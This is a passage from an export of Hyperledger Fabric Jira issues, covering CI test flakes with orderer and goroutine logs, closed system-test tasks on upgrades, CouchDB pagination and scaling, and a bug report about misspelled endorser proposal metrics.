2020-01-09T14:56:38.7417004Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.822 UTC [policies] SignatureSetToValidIdentities -> WARN 06c De-duplicating identity [OrdererMSP45aff807e067091bbab9c7e5f0958a6b4496306a589ea298bf099d361decc4e2] at index 1 in signature set
2020-01-09T14:56:38.7417670Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.826 UTC [orderer.common.broadcast] ProcessMessage -> WARN 06d [channel: systemchannel] Rejecting broadcast of config message from 127.0.0.1:40754 because of error: error applying config update to existing channel 'systemchannel': consensus metadata update for channel config update is invalid: 0 out of 2 nodes are alive, configuration will result in quorum loss
2020-01-09T14:56:38.7418172Z [e][OrdererOrg.orderer] 2020-01-09 14:55:36.827 UTC [comm.grpc.server] 1 -> INFO 06e streaming call completed grpc.service=orderer.AtomicBroadcast grpc.method=Broadcast grpc.peer_address=127.0.0.1:40754 grpc.code=OK grpc.call_duration=4.747355ms
2020-01-09T14:56:38.7418696Z [e][peer-channel-update] Error: got unexpected status: BAD_REQUEST -- error applying config update to existing channel 'systemchannel': consensus metadata update for channel config update is invalid: 0 out of 2 nodes are alive, configuration will result in quorum loss
{code}

Full logs:
https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/4964/logs/61",,btl5037,caod,denyeart,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17602,,,,,,,,,,,,,,,"07/Apr/20 5:56 AM;sykesm;79.txt;https://jira.hyperledger.org/secure/attachment/18210/79.txt","03/Mar/20 7:02 AM;tsharris;flake_e2e.log;https://jira.hyperledger.org/secure/attachment/18154/flake_e2e.log","03/Mar/20 3:16 AM;caod;raw_log_3-2-20.txt;https://jira.hyperledger.org/secure/attachment/18153/raw_log_3-2-20.txt",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017ij:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,caod,denyeart,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Feb/20 5:00 AM;wenjian;Ran into this flake against a release-2.0 PR: https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/8367/logs/69;;;","03/Mar/20 3:16 AM;caod;Hit again (see attached);;;","19/Mar/20 7:04 AM;denyeart;And again in FAB-17602;;;","07/Apr/20 5:56 AM;sykesm;And again. https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/11465/logs/79

https://jira.hyperledger.org/secure/attachment/18210/79.txt;;;","07/Apr/20 5:58 AM;btl5037;Again [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=11465&view=logs&j=945d1ea6-4264-5c9e-3810-b9b88303a301&s=b15d9194-8f26-5328-b47f-5968c76b37e7&t=070413de-71f6-55c0-9ff4-377565b26433&l=2452];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Mitigate unit test failure (timeout) in orderer/common/cluster/cluster_test with more aggressive timeout,FAB-17344,43921,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,sykesm,sykesm,10/Jan/20 1:58 AM,24/Mar/20 11:07 PM,28/Oct/23 3:09 AM,24/Mar/20 11:07 PM,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,ipm,,,,"Ah, yes. We're back to these...

{code}
2020-01-09T15:35:36.0081304Z panic: test timed out after 20m0s
2020-01-09T15:35:36.0081334Z 
2020-01-09T15:35:36.0081381Z goroutine 2083 [running]:
2020-01-09T15:35:36.0081423Z testing.(*M).startAlarm.func1()
2020-01-09T15:35:36.0081488Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1377 +0x11c
2020-01-09T15:35:36.0081534Z created by time.goFunc
2020-01-09T15:35:36.0081765Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/time/sleep.go:168 +0x52
2020-01-09T15:35:36.0081815Z 
2020-01-09T15:35:36.0081857Z goroutine 1 [chan receive, 19 minutes]:
2020-01-09T15:35:36.0081905Z testing.(*T).Run(0xc0000fc900, 0x11edc59, 0x17, 0x121ddf0, 0x1)
2020-01-09T15:35:36.0082128Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:961 +0x68a
2020-01-09T15:35:36.0082196Z testing.runTests.func1(0xc0000fc900)
2020-01-09T15:35:36.0082247Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1202 +0xa7
2020-01-09T15:35:36.0082302Z testing.tRunner(0xc0000fc900, 0xc0001a7cd8)
2020-01-09T15:35:36.0082371Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909 +0x19a
2020-01-09T15:35:36.0082421Z testing.runTests(0xc00000fe80, 0x1bf17c0, 0x4a, 0x4a, 0x0)
2020-01-09T15:35:36.0082480Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1200 +0x522
2020-01-09T15:35:36.0082546Z testing.(*M).Run(0xc000012500, 0x0)
2020-01-09T15:35:36.0082596Z 	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1117 +0x300
2020-01-09T15:35:36.0082658Z main.main()
2020-01-09T15:35:36.0082718Z 	_testmain.go:254 +0x338
2020-01-09T15:35:36.0082748Z 
2020-01-09T15:35:36.0082792Z goroutine 20 [chan receive, 20 minutes]:
2020-01-09T15:35:36.0082838Z testing.(*T).Parallel(0xc0000fca00)
...
2020-01-09T15:35:36.0475230Z goroutine 2059 [select]:
2020-01-09T15:35:36.0475289Z github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ccBalancerWrapper).watcher(0xc0003db240)
2020-01-09T15:35:36.0475358Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/balancer_conn_wrappers.go:115 +0x253
2020-01-09T15:35:36.0475417Z created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newCCBalancerWrapper
2020-01-09T15:35:36.0475492Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/balancer_conn_wrappers.go:106 +0x2b9
2020-01-09T15:35:36.0475549Z FAIL	github.com/hyperledger/fabric/orderer/common/cluster	1200.297s
{code}

The test structure is unconventional so, at the very least, we should change that to to make it easier to debug some of this.",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017ir:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/20 4:17 AM;sykesm;Hit again...

{code}
coverage: 46.9% of statements
panic: test timed out after 20m0s

goroutine 3719 [running]:
testing.(*M).startAlarm.func1()
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1377 +0x11c
created by time.goFunc
	/opt/hostedtoolcache/go/1.13.4/x64/src/time/sleep.go:168 +0x52

goroutine 1 [chan receive, 19 minutes]:
testing.(*T).Run(0xc000102900, 0x11ec616, 0x18, 0x121b580, 0x1)
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:961 +0x68a
testing.runTests.func1(0xc000102900)
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1202 +0xa7
testing.tRunner(0xc000102900, 0xc00018dcd8)
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909 +0x19a
testing.runTests(0xc000241ee0, 0x1bec7c0, 0x4a, 0x4a, 0x0)
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1200 +0x522
testing.(*M).Run(0xc000012500, 0x0)
	/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:1117 +0x300
main.main()
	_testmain.go:254 +0x338
{code}

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=5744&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=4200;;;","24/Mar/20 11:07 PM;sykesm;This issue is related to FAB-16233, which contains the information about the actual failure and this issue was to be used to mitigate the failure but putting a more aggressive timeout into the tests. Unfortunately the commit which added the mitigation (https://github.com/hyperledger/fabric/commit/592bd5061441e1719fb168e67a0f66db37c23226) was tagged with the wrong issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: Upgrade fabric version to 2.0; any ORDERER still on 1.4 SHOULD panic",FAB-17345,43922,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 3:33 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Launch a network with fabric version 1.4.4 (or 1.4.5-stable) and follow steps 1-5 in FAB-16986 to upgrade the network to v2.0.0 (or v2.0.0-beta).

However, modify step 3 by keeping one orderer on v1.4.

That orderer should panic at step 5.

Upgrade that orderer and it should recover.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16986,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1302",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: Upgrade fabric version to 2.0; any PEER still on 1.4 SHOULD panic",FAB-17346,43923,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 3:35 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Launch a network with fabric version 1.4.4 (or 1.4.5-stable) and follow steps 1-5 in FAB-16986 to upgrade the network to v2.0.0 (or v2.0.0-beta).

However, modify step 4 by keeping one peer on v1.4.

That peer should panic at step 5.

Upgrade that peer and it should recover.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16986,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,Manual,,Unset,No,,,"1|hzwqrk:5iwr4rb1304",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Pass,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: rebuild couchdb index on channel with many blocks when upgrade cc while traffic,FAB-17347,43924,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,scottz,scottz,10/Jan/20 5:41 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"This task is for executing testcase FAB-8251 as designed, or use FAB-16065 to implement the testcase with new tooling. ",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8251,,,FAB-16065,FAB-12204,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10084,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1309",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jan/20 5:36 AM;scottz;Watch for signs of FAB-12204 (peer panics when trying to rebuild indexes), which we observed in 1.3. If memory serves, the panics were due to limited resources (memory and/or cpu) during the rebuild process while traffic running, and went away when run on a k8s system with more resources. Today there should be more error logs indicating the cause clearly, if observed at all.;;;","11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: couchdb pagination, explicit, small pages sizes",FAB-17348,43925,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 5:46 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Execute FAB-11714.

 couchdb pagination test, EXplicit (currently 100,000 TX, page sizes 10, 50, 100)",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11714,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb14",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TC: couchdb pagination, implicit, larger pages sizes ",FAB-17349,43926,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 5:47 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Execute FAB-11715.

couchdb pagination test, IMplicit (currently 100,000 TX, page sizes 250, 500, 1000, and maybe add 10000)",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11715,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb18",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: barebones network test performance comparison,FAB-17350,43927,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,scottz,scottz,10/Jan/20 5:51 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,28/Jan/20 11:18 PM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Execute FAB-11623 in v2.0.0-beta with previous release (v1.4.4) to compare tps numbers for different input rates using a simple network, 1 channel and chaincode.",,dongming,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11623,,,FAB-17351,FAB-17449,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|hzwqfp:k",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),dongming,scottz,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jan/20 6:35 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/68];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling peers,FAB-17351,43928,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:00 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run on single peer, and scale up to 100 peers in one org. (with gossip on)

Refer also to FAB-11666.

Either, or both:  (A) many in one org, or (B) one peer per org",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17350,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1c",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling orderers,FAB-17352,43929,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:03 AM,11/Jan/21 2:30 AM,28/Oct/23 3:09 AM,11/Jan/21 2:30 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run on single orderer, and scale up to 100 orderers in one org. Use raft.

Either or both:  (A) many in one org, or (B) one orderer per org

Refer to FAB-14230 for assistance.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb134",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling chaincodes,FAB-17353,43930,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:06 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run using 1 chaincode in one channel, and scale up to 100+ chaincodes.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1o",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling chaincode versions upgrades,FAB-17354,43931,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:09 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run 1 thread single chaincode, while upgrading chaincode version repeatedly up to 100 times, or even up to 1000. It should be boring - unless the old one is not deleted when upgrade in which case the resource utilization may climb so watch for problems there.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb1u",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling channels,FAB-17355,43932,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:13 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run one thread on a single channel, and then add more channels up to 100 (or 1000?) channels. As ramp up the number of channels, reduce the traffic input rate per channel.

Refer to FAB-14350 and 13892.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TC: Scaling privatedata collections,FAB-17356,43933,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,scottz,scottz,10/Jan/20 6:24 AM,11/Jan/21 2:29 AM,28/Oct/23 3:09 AM,11/Jan/21 2:29 AM,,,,,,,,,,Future,,,,fabric-quality,,,,,,,,,0,,,,,,"Simple traffic test, maybe reuse 17350 or part of it. Run traffic on a single channel with one chaincode instantiated with one privatedata collection defined. Then add more privatedata collections up to 100 (or 1000?) in same (or different?) chaincode instantiations. Send traffic to all.",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10081,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb26",,,,Unset,Unset,Test Cases,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:07 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Endorser proposal metrics seem broken,FAB-17357,43934,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,10/Jan/20 6:53 AM,24/Feb/20 2:42 PM,28/Oct/23 3:09 AM,08/Feb/20 4:18 AM,v1.4.4,v2.0.0,,,,,,,,v1.4.5,v2.1.0,,,fabric-peer,,,,,,,,,0,ipm,,,,,"Working with [~pandrejko] we noticed:

1. {{proposal_duration}} is mis-spelled as {{propsal_duration}}
2. The sum of ""successful"" and ""received"" proposals are not the same yet there are no ""failed"" proposals.

{code}
$ curl --insecure --cert ./auth.crt --key ./auth.key -s https://nc71930-peer2org1.pa1113multizone.us-south.containers.appdomain.cloud:9443/metrics | grep endorser | grep -v _bucket | grep -v '#' | sort -u
endorser_chaincode_instantiation_failures{chaincode=""demoContract:0.0..1"",channel=""channel1""} 1
endorser_proposals_received 282
endorser_propsal_duration_count{chaincode=""cscc:"",channel="""",success=""true""} 181
endorser_propsal_duration_count{chaincode=""lscc:"",channel=""channel1"",success=""false""} 1
endorser_propsal_duration_count{chaincode=""lscc:"",channel="""",success=""true""} 40
endorser_propsal_duration_count{chaincode=""lscc:v1.4.3"",channel=""channel1"",success=""true""} 10
endorser_propsal_duration_count{chaincode=""lscc:v1.4.3"",channel=""channel2"",success=""true""} 3
endorser_propsal_duration_count{chaincode=""qscc:"",channel="""",success=""true""} 45
